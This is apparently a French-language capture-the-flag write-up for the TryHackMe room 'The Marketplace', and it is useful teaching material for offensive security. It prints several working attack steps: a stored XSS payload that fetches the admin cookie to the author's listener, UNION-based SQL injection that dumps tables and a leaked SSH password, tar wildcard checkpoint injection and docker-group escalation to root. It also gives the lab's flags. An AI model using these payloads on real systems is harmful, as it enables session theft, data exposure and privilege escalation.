# The Marketplace #

## Task 1 The Marketplace ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.126.192 marketplace.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A marketplace.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 12:24 CEST
Nmap scan report for marketplace.thm (10.10.126.192)
Host is up (0.035s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   34.10 ms 10.9.0.1
2   33.98 ms marketplace.thm (10.10.126.192)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.62 seconds

```

On remarque plusieurs services : 
Le service SSH sur le port 22.   
Le service HTTP sur le port 80 et 32768. 

![page1](./Task1-01.png)

Sur la page principale du site on peut créer un compte.  

![page2](./Task1-02.png) 

On crée un nouveau compte.   

![page3](./Task1-03.png) 

On s'identifie.    

![page4](./Task1-04.png)   

Dans New listing on écrit du code javascript pour voir si le site est vulnérable à la faille XSS.   

![page5](./Task1-05.png)   

Le message du scripte apparaît, le site est vulnérable à la faille XSS.   

![page6](./Task1-06.png)   

On regarde si on a un cookie.  
On a bien un cookie.
Si on peut voler le cookie administrateur on sera connecter en tant que administrateur.    

```bash
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
```

D'arpès le scan nmap le site possède un fichier robots.txt avec le chemin /admin.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234 
listening on [any] 1234 ...
```

On va envoyer le cookie par le port 1234, donc on écoute le port 1234 pour les recevoir.   

![page7](./Task1-07.png)   

```text
<script>fetch("http://10.9.228.66:1234/"+document.cookie)</script>
```

On écrit le script qui lit le cookie et le renvoie sur le port 1234.

Allez dans report to listing to admins.   

![page8](./Task1-08.png)   

On clique sur Report.  
On clique sur Messages et le cookie est envoyé.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234 
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.126.192] 48422
GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MzExODY3ODd9.mwGiWnhbp15_lWZHPp1IvB6dJqjArsHpuDU0-JB1lQs HTTP/1.1
Host: 10.9.228.66:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: */*
Origin: http://localhost:3000
Referer: http://localhost:3000/item/4
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

![page9](./Task1-09.png) 

Dans le mode développeur de firefox touche F12, dans storage on modifie la valeur du cookie avec celui de l'administrateur.  

**What is flag 1?**

![page10](./Task1-10.png) 

Maintenant on peut accéder panneau de control administrateur.  
On trouve notre premier flag qui est : THM{c37a63895910e478f28669b048c348d5}    

![page11](./Task-11.png)

On ajoutant ' à la fin de l'url on obtient une erreur sql donc le site est vulnérable au injection SQL.    

On fait des injections pour récupérer les informations que l'on veut.  

```text
http://marketplace.thm/admin/?user=user=1 AND 1=2 union select database(),@@version,1,1
User 8.0.21
ID: marketplace
Is administrator: true 

En tout il y a 4 champs, on voit que le nom de la basse de donnée est marketplace.   

http://marketplace.thm/admin/?user=user=1 AND 1=2 union select group_concat(table_name),1,1,1 from information_schema.tables where table_schema=database()-- 

 User 1
ID: items,messages,users
Is administrator: true 

On récupère des noms de table.

http://marketplace.thm/admin/?user=user=1 AND 1=2 union select group_concat(column_name),1,1,1 from information_schema.columns where table_schema=database()--
id,author,title,description,image,id,user_from,user_to,message_content,is_read,id,username,password,isAdministrator

On récupère des noms de table.   

User 1
ID: id,author,title,description,image,id,user_from,user_to,message_content,is_read,id,username,password,isAdministrator
Is administrator: true 

http://marketplace.thm/admin/?user=1 AND 1=2 union select message_content,1,2,3 from messages where id=1
User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ

On récupère les messages, un message contient un mot de passe : @b_ENXkGYUCAv3zJ.   
```

D'après le tableau bord on a comme nom : system, michael, jake, personne.  
On sait que c'est pas personne et system.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh jake@marketplace.thm 
The authenticity of host 'marketplace.thm (10.10.5.28)' can't be established.
ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'marketplace.thm,10.10.5.28' (ECDSA) to the list of known hosts.
jake@marketplace.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep  9 12:36:14 UTC 2021

  System load:  0.0                Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.5.28
  Memory usage: 28%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    96

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.
```

On testant les noms on obtient un shell avec jake.   

**What is flag 2? (User.txt)**

```bash
jake@the-marketplace:~$ ls 
user.txt
jake@the-marketplace:~$ cat user.txt 
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

Dans le répertoire jake on trouve un fichier user.txt avec le flag.
On le lit et on trouve la réponse qui est : THM{c3648ee7af1369676e3e4b15da6dc0b4}   

**What is flag 3? (Root.txt)**
```bash
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

Dans le fichier de configuration sudo on voit que l'on exécuter backup.sh avec les droits michael.    

```bash
jake@the-marketplace:~$ ls -al /opt/backups/backup.sh 
-rwxr-xr-x 1 michael michael 73 Aug 23  2020 /opt/backups/backup.sh

jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *

```

On voit que l'on peut pas écrire dans backup.sh.   
Dans fichier backup.sh on voit que tar est exécuter avec un willcard (joker).   
On peut l'exploiter  pour une evélation de privillège.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1234
listening on [any] 1234 ...
-----
jake@the-marketplace:~$ cd /opt/backups/
jake@the-marketplace:/opt/backups$ echo > --checkpoint=1 
jake@the-marketplace:/opt/backups$ echo > '--checkpoint-action=exec=sh shell.sh'
jake@the-marketplace:/opt/backups$ echo "/bin/bash" > shell.sh
jake@the-marketplace:/opt/backups$ chmod +x shell.sh 
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
tar: backup.tar: file is the archive; not dumped
```

On exploite la faille wilcard en faisant exécuter notre scripte.  
On obtient les droits de michael.    

```bash
michael@the-marketplace:/home/michael$ groups
michael docker
michael@the-marketplace:/home/michael$ id

uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
michael@the-marketplace:/home/michael$ docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        12 months ago       2.16GB
nginx                        latest              4bb46517cac3        13 months ago       133MB
node                         lts-buster          9c4cc2688584        13 months ago       886MB
mysql                        latest              0d64f46acfd1        13 months ago       544MB
alpine                       latest              a24bb4013296        15 months ago       5.57MB

# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cat /root/root.txt	
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
# 
```

On remarque que l'on est dans un group docker.   
On voit que l'on peut exploiter apline pour avoir les droits root.   
On démare l'image alpine et on obtient un shell root.    
On lit le fichier root.txt du répertoire root.    
On obtient  le dernier flag.  
La réponse est : THM{d4f76179c80c0dcf46e0f8e43c9abd62}      
